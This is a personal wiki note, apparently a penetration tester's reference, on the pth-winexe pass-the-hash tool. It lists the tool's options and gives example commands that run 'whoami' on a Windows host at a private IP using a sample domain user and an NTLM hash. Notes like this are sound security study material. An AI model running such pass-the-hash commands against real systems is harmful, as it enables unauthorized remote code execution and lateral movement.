Content-Type: text/x-zim-wiki
Wiki-Format: zim 0.6
Creation-Date: 2021-10-26T12:05:57-05:00

====== pth-winexe ======
Created Tuesday 26 October 2021

===== Description =====
* Executes a command  on a windows host using the SMB protocol 
* Uses TCP 445
* Administrative privilege are required due to the creation of a winexe service on the target host. Ie, hash passed must be of an admin.
* Local admins or AD admins both work


===== Installation =====
* Kali: Installed by default

===== Usage =====
{{{code: lang="sh" linenumbers="False"
pth-winexe [OPTION]... //HOST COMMAND
}}}


===== Options =====
{{{code: lang="texinfo" linenumbers="False"
-h, --help                                  Display help message
-V, --version                               Display version number
-U, --user=[DOMAIN/]USERNAME[%PASSWORD]     Set the network username
-A, --authentication-file=FILE              Get the credentials from a file
-N, --no-pass                               Do not ask for a password
-k, --kerberos=STRING                       Use Kerberos, -k [yes|no]
-d, --debuglevel=DEBUGLEVEL                 Set debug level
  --uninstall                             Uninstall winexe service after remote execution
  --reinstall                             Reinstall winexe service before remote execution
  --system                                Use SYSTEM account
  --profile                               Load user profile
  --convert                               Try to convert characters between local and remote code-pages
  --runas=[DOMAIN\]USERNAME%PASSWORD      Run as the given user (BEWARE: this password is sent in
                                          cleartext over the network!)
  --runas-file=FILE                       Run as user options defined in a file
  --interactive=0|1                       Desktop interaction: 0 - disallow, 1 - allow. If allow, also
                                          use the --system switch (Windows requirement). Vista does not
                                          support this option.
  --ostype=0|1|2                          OS type: 0 - 32-bit, 1 - 64-bit, 2 - winexe will decide.
                                          Determines which version (32-bit or 64-bit) of service will be
                                          installed.
}}}


===== Remaks =====
* Domain/ user combo can be given as follows:
	* <domain>\\<user>       # NetBIOS Domain
	* <domain>/<user>        # NetBIOS Domain
	* <fqdn>\\<user>
	* <fqdn>/<user>

===== Examples =====
{{{code: lang="sh" linenumbers="False"
pth-winexe -U <user>%aad3b435b51404eeaad3b435b51404ee:<ntlm_hash> //<host> <command>
}}}

* Runs <command> on <host> as <user> by passing <ntlm_hash>
* The aa..ee blurp is required

{{{code: lang="texinfo" linenumbers="False"
pth-winexe -U  svcorp/alice%aad3b435b51404eeaad3b435b51404ee:7f004ce6b8f7b2a3b6c477806799b9c0 //10.11.1.22 whoami
}}}

* Note the domain

===== SANANGO =====
* platform/windows/authattacks/pass_the_hash

===== SEE =====
[[AttackVectors:Windows:Active Directory:PassTheHash]]
https://www.infosecmatter.com/rce-on-windows-from-linux-part-3-pth-toolkit/
